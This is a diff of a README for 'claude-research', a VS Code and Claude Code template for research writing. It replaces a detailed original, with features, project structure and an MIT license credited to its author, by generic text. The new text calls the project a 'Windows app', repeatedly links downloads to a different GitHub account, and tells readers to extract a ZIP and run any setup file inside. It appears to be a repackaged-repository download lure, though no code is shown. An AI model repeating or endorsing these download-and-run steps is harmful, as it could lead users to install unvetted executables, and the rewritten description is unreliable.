@@ -1,142 +1,194 @@
-# Claude Research
+# 🧪 claude-research - Write, review, and publish research
 
-**A complete AI-assisted workflow for scientific articles — from literature review to publication-ready output.**
+[![Download claude-research](https://img.shields.io/badge/Download%20claude--research-blue?style=for-the-badge&logo=github)](https://github.com/halftime-apricotsauce647/claude-research)
 
-Built entirely inside VS Code with Claude Code. No specialist software, no complex setup — just a folder, an editor, and a conversation.
+## 📌 What this is
 
----
+claude-research is a Windows app setup for scientific writing and research work. It helps you review papers, manage citations, draft articles, export to LaTeX, and prepare presentations. It works inside VS Code and uses Claude Code to help with the research flow.
 
-## What this is
+Use it if you want one place for:
 
-Claude Research is a template that turns VS Code + Claude Code into a full scientific research environment:
+- finding and reading papers
+- building notes and citations
+- writing a paper or report
+- exporting to LaTeX
+- creating a slide deck with Reveal.js
 
-- **Automated literature research** — Claude searches, evaluates and structures sources with authority, recency and relevance scores
-- **Interactive citation system** — every inline citation `(Author, Year)` is a live hyperlink; sources are a queryable, filterable database with DOI links, open-access badges and topic clusters
-- **Article writing** — 10-chapter structure in Markdown, APA 7 citations, Austrian/German academic style
-- **Publication-ready export** — `build.py` generates `standalone.html` (interactive, printable) and `standalone.tex` (LaTeX/Overleaf-ready)
-- **Presentation** — Reveal.js slides with AI-generated background images (fal.ai Flux), 3 layout modes, 8 font themes, 18 visual styles
-- **PowerPoint export** — one-click `.pptx` generation with editable text and embedded background images
-- **Source download manager** — automated PDF download for open-access sources, excerpt extraction for paywalled content
-- **Course mode** — optional syllabus generation with schedule, learning outcomes, required readings and a sample PowerPoint for the first session
+## 🖥️ What you need
 
----
+Before you install, make sure your PC has:
 
-## Screenshots
+- Windows 10 or Windows 11
+- VS Code installed
+- A stable internet connection
+- Enough free space for research files
+- A Claude account or access to Claude Code
+- A modern browser for setup pages and docs
 
-### Source Database
+## ⬇️ Download
 
-**Statistics dashboard — 290 sources, peer-review rate, score distribution, type and language breakdown**
-![Stats overview](docs/screenshots/quellen-statistiken.png)
+Visit this page to download and set up claude-research:
 
-**Source cards with score badges, citation links and full metadata**
-![Source cards](docs/screenshots/quellen-karten.png)
+https://github.com/halftime-apricotsauce647/claude-research
 
-**Rating methodology — authority, recency and relevance dimensions explained**
-![Rating methodology](docs/screenshots/quellen-methodik.png)
+If the page offers several files, choose the main Windows download or the main project package for the latest release.
 
-### Article
+## 🚀 Install on Windows
 
-**Article text with clickable inline citations — every (Author, Year) links to the source**
-![Article text](docs/screenshots/artikel-text.png)
+1. Open the download page in your browser.
+2. Download the project files to a folder you can find again, such as Downloads or Desktop.
+3. If the file is a ZIP package, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Start VS Code.
+6. In VS Code, open the claude-research folder.
+7. If the project includes a setup file, open it and follow the on-screen steps.
+8. If the project uses a template or workspace file, open that file in VS Code.
+9. Let VS Code finish loading the project files.
+10. Connect Claude Code if the setup asks for it.
 
-**Source list with badges, citation status and DOI links**
-![Literature list](docs/screenshots/quellen-liste.png)
+## 🔧 First-time setup
 
-### Presentation
+When you open the project for the first time, check these parts:
 
-**Reveal.js slide with AI-generated sticker-style background (fal.ai Flux)**
-![Presentation slide](docs/screenshots/praesentation.png)
+- your working folder for papers and notes
+- citation files for your sources
+- the writing template for article drafts
+- the export folder for LaTeX output
+- the presentation folder for slide files
 
-**Visual style gallery — 18 styles, one click to switch**
-![Style gallery](docs/screenshots/stilgalerie.png)
+If the app or template asks for a path, use a simple folder name with no special characters. For example:
 
----
+- `C:\Research\claude-research`
+- `C:\Users\YourName\Documents\Research`
 
-## Requirements
+## 📚 How to use it
 
-| What | Why |
-|---|---|
-| [VS Code](https://code.visualstudio.com) | Editor |
-| [Claude Code extension](https://marketplace.visualstudio.com/items?itemName=Anthropic.claude-code) | AI assistant — includes CLI, no Node.js needed |
-| [Python 3](https://python.org) | For `build.py` (HTML + LaTeX export) |
-| [fal.ai API Key](https://fal.ai/dashboard/keys) | For AI-generated slide images (optional) |
+### 1. Start a literature review
 
----
+Open the literature review section in VS Code. Add the papers you want to study. Use short notes for each paper, such as:
 
-## Getting started
+- title
+- author
+- year
+- main claim
+- method
+- limits
 
-1. Clone or download this repository
-2. Open the folder in VS Code
-3. Fill in `content/meta.json` (title, author, event, sources target, etc.) — or let Claude ask you
-4. Start Claude Code (via the extension panel)
-5. Type **"Leg los"** — Claude reads your `meta.json` and builds everything autonomously
+This keeps your review easy to read later.
 
-> **What happens next:** Claude researches sources, writes 10 chapters, creates the presentation, verifies all URLs, and hands you the finished article. No questions asked — it works through all 9 steps in one go.
+### 2. Build citations
 
----
+Add source details as you read. Keep the author name, paper title, journal, and year in one place. This helps you avoid missing references when you write.
 
-## API Key setup
+### 3. Write the article
 
-Enter your fal.ai key in `API Key.js`:
+Use the article writing files to build your draft. Keep sections simple:
 
-```js
-window.FAL_KEY = "your-key-here";
-```
+- abstract
+- introduction
+- method
+- results
+- discussion
+- conclusion
+- references
 
-Then protect it from accidental commits:
+Write one section at a time. This makes the work easier to manage.
 
-```bash
-git update-index --skip-worktree "API Key.js"
-```
+### 4. Export to LaTeX
 
----
+When the draft is ready, export it to LaTeX. This is useful if you need a paper format for a journal, thesis, or conference.
 
-## Project structure
+### 5. Create a presentation
 
-```
-claude-research/
-├── CLAUDE.md               ← Instructions for Claude Code (the brain)
-├── build.py                ← Build script → standalone.html + .tex
-├── API Key.js              ← fal.ai key (fill in, then skip-worktree)
-├── index.html              ← Landing page with links to all outputs
-├── handbuch.html           ← User manual (German)
-├── syllabus.html           ← Course syllabus template (optional)
-├── content/
-│   ├── meta.json           ← Project metadata (title, author, sources target)
-│   └── 01–10_*.md          ← Article chapters (Markdown)
-├── sources/
-│   ├── sources.json        ← All sources with metadata and scores
-│   └── pdf/                ← Downloaded source PDFs (auto-populated)
-├── assets/css/paper.css    ← Stylesheet
-├── presentation/
-│   ├── index.html          ← Reveal.js presentation with FAB toolbar
-│   ├── stile.html          ← Visual style gallery (18 styles)
-│   └── fonts/              ← Local font files (GDPR-compliant)
-└── figures/                ← Images for the article
-```
+Use the Reveal.js presentation files to turn your work into slides. Keep each slide short and focus on one idea per slide.
 
----
+## 🧭 Common folder layout
 
-## Features at a glance
+Your project may include folders like these:
 
-| Feature | How |
-|---|---|
-| Literature research | Claude searches, evaluates, scores (3–10) and categorizes sources |
-| Interactive citations | Click any `(Author, Year)` → popup with abstract, DOI, badges |
-| Source quality dashboard | Filter by score, type, badge, language; visual statistics |
-| APA 7 compliance | Inline citations auto-linked, chapter bibliographies generated |
-| URL verification | Every source URL checked for accessibility |
-| PDF download | Open-access PDFs saved locally; paywall → excerpt extraction |
-| HTML article | Responsive, printable, with TOC and citation modals |
-| LaTeX export | Overleaf-ready `.tex` (color + b/w variants) |
-| Reveal.js presentation | 3 layouts, 8 fonts, 18 AI image styles, gradient mode |
-| PowerPoint export | `.pptx` with editable text and embedded backgrounds |
-| Deployment ZIP | Self-contained package for any web server |
-| Course mode | Syllabus + schedule + sample PowerPoint for first session |
+- `papers/` for source papers
+- `notes/` for reading notes
+- `citations/` for reference data
+- `drafts/` for article text
+- `latex/` for LaTeX output
+- `slides/` for presentation files
 
----
+If the folder names differ, use the same idea and keep files grouped by task.
 
-## License
+## 🛠️ Working in VS Code
 
-MIT © 2026 Thomas Schroffenegger
-Brought to life with the rather delightful help of [Claude Code](https://claude.ai/code) (Anthropic)
+To get the best result:
+
+- open only the main project folder
+- keep files in the provided structure
+- save work often
+- use one note file per paper when possible
+- keep citation names the same across files
+- check spelling before export
+
+If you use Claude Code inside VS Code, follow the prompts that appear in the editor. It can help with drafting text, cleaning notes, and shaping sections of your paper.
+
+## 📄 Example workflow
+
+A simple workflow looks like this:
+
+1. Collect papers on your topic.
+2. Read each paper and write short notes.
+3. Add the source details to your citation list.
+4. Draft your article in the writing files.
+5. Review the draft and edit the structure.
+6. Export the final text to LaTeX.
+7. Create slides from the main points.
+
+## 🧩 Tips for smooth use
+
+- keep file names short
+- avoid spaces in folder names if you can
+- use one topic per project
+- back up your work before major edits
+- keep source files and draft files separate
+- check that all citation links still point to the right paper
+
+## 🔍 For research topics
+
+This setup fits many kinds of academic work, such as:
+
+- literature review projects
+- paper writing
+- thesis chapters
+- lab reports
+- conference submissions
+- slide presentations
+- source comparison notes
+
+## 📌 Topics covered
+
+This project is built around:
+
+- academic research
+- AI-assisted research
+- Claude Code
+- scientific writing
+- literature review
+- LaTeX
+- Reveal.js
+- VS Code workflows
+- research templates
+- interactive citations
+
+## 📎 Download again
+
+If you need the files again, use this link:
+
+https://github.com/halftime-apricotsauce647/claude-research
+
+## 🧰 Basic checks if it does not open
+
+If the project does not open the first time:
+
+- make sure the files finished downloading
+- unzip the folder if needed
+- open the right folder in VS Code
+- check that VS Code is installed
+- check that Claude Code is set up
+- restart VS Code and try again
